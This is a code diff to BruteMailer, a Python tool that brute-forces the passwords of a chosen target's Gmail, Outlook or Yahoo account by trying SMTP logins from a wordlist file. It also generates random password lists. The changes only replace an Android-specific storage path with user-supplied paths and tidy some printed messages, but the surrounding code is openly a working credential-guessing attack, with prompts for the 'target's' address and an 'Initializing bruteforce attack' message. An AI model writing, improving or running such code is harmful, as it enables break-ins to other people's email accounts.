@@ -31,7 +31,7 @@ def brute_mailer(domain, pass_file, email):
         server = smtplib.SMTP(host=domain, port=587)
         server.starttls()
 
-        with open(f"/storage/emulated/0/{pass_file}", "r") as file:
+        with open(pass_file, "r") as file:
                 passwords = file.readlines()
                 for password in passwords:
                         try:
@@ -75,6 +75,7 @@ ____             _       __  __       _ _
 """)
         domain = "smtp.gmail.com"
         gmail_address = input(f"{YELLOW}Enter your target's gmail address:{RESET} ")
+
         if not gmail_address.endswith("@gmail.com"):
                 print("\n")
                 print(RED)
@@ -84,10 +85,9 @@ ____             _       __  __       _ _
                 program_intro()
         print("\n")
         print(GREEN)
-        print("[+] Make sure the .txt password file is in this directory: /storage/emulated/0 \nIf you don't already have a password file,use this tool's in-built password generator")
         print("\n")
-        pass_file = input(f"{YELLOW}Enter password file name:{RESET} ")
-        path = pathlib.Path("/storage/emulated/0/" + pass_file)
+        pass_file = input(f"{YELLOW}Enter the path to your password txt file:{RESET} ")
+        path = pathlib.Path(pass_file)
         if path.exists():
                 print("\n")
                 print(GREEN)
@@ -113,16 +113,15 @@ ____             _       __  __       _ _
 """)
         domain = "smtp.office365.com"
         outlook_address = input(f"{YELLOW}Enter your target's outlook mail address:{RESET} ")
+
         if not outlook_address.endswith("@outlook.com"):
                 print("\n")
                 print(f"{RED}Enter a valid Outlook mail address!{RESET}")
                 time.sleep(2)
                 program_intro()
         print("\n")
-        print(f"{GREEN}[+] Make sure the .txt password file is in this directory: /storage/emulated/0 \nIf you don't already have a password file,use this tool's in-built password generator")
-        print("\n")
-        pass_file = input(f"{YELLOW}Enter password file name{RESET}: ")
-        path = pathlib.Path("/storage/emulated/0/" + pass_file)
+        pass_file = input(f"{YELLOW}Enter the path to your password txt file:{RESET} ")
+        path = pathlib.Path(pass_file)
         if path.exists():
                 print("\n")
                 print(GREEN)
@@ -155,10 +154,8 @@ ____             _       __  __       _ _
                 time.sleep(2)
                 program_intro()
         print("\n")
-        print(f"{GREEN}[+] Make sure the .txt password file is in this directory: /storage/emulated/0 \nIf you don't already have a password file,use this tool's in-built password generator{RESET}")
-        print("\n")
-        pass_file = input(f"{YELLOW}Enter password file name:{RESET} ")
-        path = pathlib.Path("/storage/emulated/0/" + pass_file)
+        pass_file = input(f"{YELLOW}Enter the path to your password txt file:{RESET} ")
+        path = pathlib.Path(pass_file)
         if path.exists():
                 print(f"{GREEN}Initializing bruteforce attack on {yahoo_address}......")
                 print(RESET)
@@ -191,11 +188,10 @@ ____             _       __  __       _ _
                 passwords.append("".join(  [secrets.choice(string.digits + string.ascii_letters + string.punctuation) for _ in range(length)]))
         pass_file = "\n".join(passwords)
         filename = "passwords_file.txt"
-        path = "/storage/emulated/0/"
-        with open(os.path.join(path, filename), "w") as file:
+        with open(filename, "w") as file:
                 file.write(pass_file)
         print("\n")
-        print(f"{GREEN}[✓] The generated passwords have been saved as 'passwords_file.txt' in the following directory: /storage/emulated/0/{RESET}")
+        print(f"{GREEN}[✓] The generated passwords have been saved as 'passwords_file.txt' in your curreent working directory{RESET}")
         time.sleep(4)
         print(lb)
         print("Thanks for using BruteMailer,don't forget to follow me on github(SoloTech01) for more awesome tools...")
@@ -222,10 +218,8 @@ ____             _       __  __       _ _
 |  _ \| '__| | | | __/ _ \ |\/| |/ _` | | |/ _ \ '__|
 | |_) | |  | |_| | ||  __/ |  | | (_| | | |  __/ |
 |____/|_|   \__,_|\__\___|_|  |_|\__,_|_|_|\___|_|
-
 """)
-        print(YELLOW)
-        print("******" * 10)
+        print(f"{'******' * 10} {YELLOW}")
         print("""
 [+] Tool name: BruteMailer
 [+] Author: Solomon Adenuga
@@ -234,9 +228,7 @@ ____             _       __  __       _ _
 [+] Whatsapp: +2348023710562
 """)
         print("******" * 10)
-        print(YELLOW)
-        print(lb)
-        print("<<<<<<<<<<<<<<<<<SELECT YOUR TARGET'S' EMAIL SERVICE<<<<<<<<<<<<<<<<<")
+        print(f"{lb}<<<<<<<<<<<<<<<<<SELECT YOUR TARGET'S' EMAIL SERVICE<<<<<<<<<<<<<<<<<")
         print(GREEN)
         print(f"""
 [1] Gmail
